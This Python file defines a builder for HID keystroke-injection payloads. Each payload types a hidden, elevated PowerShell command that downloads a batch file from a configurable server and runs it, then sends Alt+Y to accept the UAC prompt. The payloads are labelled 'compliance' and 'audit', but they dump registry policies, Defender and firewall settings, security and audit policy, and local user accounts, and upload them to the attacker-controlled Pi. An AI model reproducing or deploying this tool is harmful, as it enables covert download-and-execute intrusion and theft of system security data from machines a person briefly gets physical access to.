
"""
Payload builder for generating HID injection scripts.
Supports dynamic templates with variable substitution.
"""

from datetime import datetime
import json


class PayloadBuilder:
    """Builds executable HID payloads from templates"""
    
    def __init__(self, config_path='config.json'):
        self.payloads = {}
        self.config = self._load_config(config_path)
        self._register_default_payloads()

    def _load_config(self, config_path):
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            # Fallback to default if config is missing or invalid
            return {
                "network": {
                    "server_ip": "172.16.0.1",
                    "upload_port": 8000
                }
            }
    
    def _get_bat_payload_commands(self, bat_filename):
        return [
            {'action': 'combo', 'keys': ['WIN', 'r']},
            {'action': 'delay', 'ms': 500},
            {'action': 'type', 'text': f'powershell -w hidden -c "Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList \'-nop -w hidden -c iwr http://{{{{SERVER_IP}}}}/payloads/{bat_filename} -OutFile $env:TEMP\\p.bat; cmd /c $env:TEMP\\p.bat\'"'},
            {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
            {'action': 'delay', 'ms': 6000},
            {'action': 'combo', 'keys': ['ALT', 'y']},
        ]

    def _register_default_payloads(self):
        """Register built-in payload templates"""
        
        # System info collector
        self.payloads['sysinfo'] = {
            'name': 'System Information Collector',
            'description': 'Collects Windows system information',
            'commands': self._get_bat_payload_commands('sysinfo.bat')
        }
        
        # Compliance check payload
        self.payloads['compliance'] = {
            'name': 'Compliance Check',
            'description': 'Checks security compliance and reports',
            'commands': self._get_bat_payload_commands('compliance.bat')
        }
        
        # Simple test payload
        self.payloads['test'] = {
            'name': 'Test Payload',
            'description': 'Opens notepad with test message',
            'commands': self._get_bat_payload_commands('test.bat')
        }
        
        # Registry export - Policies (Works on Home)
        self.payloads['export_policies'] = {
            'name': 'Export Registry Policies',
            'description': 'Exports HKLM Policies and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_policies.bat')
        }
        
        self.payloads['export_user_policies'] = {
            'name': 'Export User Policies',
            'description': 'Exports HKCU Policies and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_user_policies.bat')
        }
        
        # Registry export - Services (Works on Home)
        self.payloads['export_services'] = {
            'name': 'Export Services Registry',
            'description': 'Exports Services and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_services.bat')
        }
        
        # Registry export - Control (Works on Home)
        self.payloads['export_control'] = {
            'name': 'Export Control Registry',
            'description': 'Exports Control and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_control.bat')
        }
        
        # Firewall export (Works on Home)
        self.payloads['export_firewall'] = {
            'name': 'Export Firewall Config',
            'description': 'Exports firewall and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_firewall.bat')
        }
        
        # Defender settings (Works on Home)
        self.payloads['export_defender'] = {
            'name': 'Export Defender Settings',
            'description': 'Exports Defender and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_defender.bat')
        }
        
        # Driver enumeration (Works on Home)
        self.payloads['export_drivers'] = {
            'name': 'Export Driver List',
            'description': 'Exports drivers and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_drivers.bat')
        }
        
        # Device enumeration (Works on Home)
        self.payloads['export_devices'] = {
            'name': 'Export Device List',
            'description': 'Exports devices and uploads to Pi',
            'commands': self._get_bat_payload_commands('export_devices.bat')
        }
        
        # Combined audit (All Home-compatible commands)
        self.payloads['full_audit'] = {
            'name': 'Full System Audit',
            'description': 'Runs all Home-compatible exports (Elevated)',
            'commands': self._get_bat_payload_commands('full_audit.bat')
        }
        
        
        # HKCU registry query - actual enforced user policy state
        self.payloads['export_registry_hkcu'] = {
            'name': 'Export HKCU Registry Policies',
            'description': 'Queries HKCU\\Software\\Policies (actual enforced state)',
            'commands': self._get_bat_payload_commands('export_registry_hkcu.bat')
        }

        # RSOP Computer via WMI - structured policy objects
        self.payloads['export_rsop_computer'] = {
            'name': 'Export RSOP Computer (WMI)',
            'description': 'Queries RSOP computer namespace via WMI',
            'commands': self._get_bat_payload_commands('export_rsop_computer.bat')
        }

        # RSOP User via CIM - modern, faster than WMI
        self.payloads['export_rsop_user'] = {
            'name': 'Export RSOP User (CIM)',
            'description': 'Queries RSOP user namespace via modern CIM',
            'commands': self._get_bat_payload_commands('export_rsop_user.bat')
        }

        # Secedit - account policies, user rights, security options
        self.payloads['export_secedit'] = {
            'name': 'Export Security Policy (secedit)',
            'description': 'Exports account policies, user rights and security options',
            'commands': self._get_bat_payload_commands('export_secedit.bat')
        }

        # Auditpol - advanced audit policy categories
        self.payloads['export_auditpol'] = {
            'name': 'Export Audit Policies (auditpol)',
            'description': 'Dumps all audit policy categories (logon, privilege usage)',
            'commands': self._get_bat_payload_commands('export_auditpol.bat')
        }

        # Net user - local user accounts and restrictions
        self.payloads['export_net_users'] = {
            'name': 'Export Local Users (net user)',
            'description': 'Enumerates local users with logon restrictions and policy info',
            'commands': self._get_bat_payload_commands('export_net_users.bat')
        }

        # Group Policy cache - applied GPO GUIDs and cached settings
        self.payloads['export_gp_cache'] = {
            'name': 'Export Group Policy Cache',
            'description': 'Lists GP cache (applied GPO GUIDs, cached settings)',
            'commands': self._get_bat_payload_commands('export_gp_cache.bat')
        }

        # Upload audit files to Pi
        self.payloads['upload_files'] = {
            'name': 'Upload Audit Files',
            'description': 'Uploads all audit files to Pi (Elevated)',
            'commands': self._get_bat_payload_commands('upload_files.bat')
        }
    
    def get_payload(self, name, variables=None):
        """
        Get payload by name with variable substitution.
        
        Args:
            name: Payload name
            variables: Dict of variables to substitute
        
        Returns:
            List of commands with substituted variables
        """
        if name not in self.payloads:
            raise ValueError(f"Payload '{name}' not found")
        
        payload = self.payloads[name].copy()
        commands = payload['commands']
        
        # Default variables
        default_vars = {
            'TIMESTAMP': datetime.now().isoformat(),
            'HOST_ID': 'unknown',
            'SERVER_IP': self.config['network']['server_ip'],
            'UPLOAD_PORT': self.config['network']['upload_port']
        }
        
        # Merge with provided variables
        if variables:
            default_vars.update(variables)
        
        # Substitute variables in commands
        substituted = []
        for cmd in commands:
            new_cmd = cmd.copy()
            if 'text' in new_cmd:
                text = new_cmd['text']
                for var, value in default_vars.items():
                    text = text.replace(f'{{{{{var}}}}}', str(value))
                new_cmd['text'] = text
            substituted.append(new_cmd)
        
        return substituted
    
    def list_payloads(self):
        """List all available payloads"""
        return {
            name: {
                'name': payload['name'],
                'description': payload['description']
            }
            for name, payload in self.payloads.items()
        }
    
    def add_custom_payload(self, name, description, commands):
        """
        Add a custom payload.
        
        Args:
            name: Unique payload identifier
            description: Human-readable description
            commands: List of command dictionaries
        """
        self.payloads[name] = {
            'name': name,
            'description': description,
            'commands': commands
        }
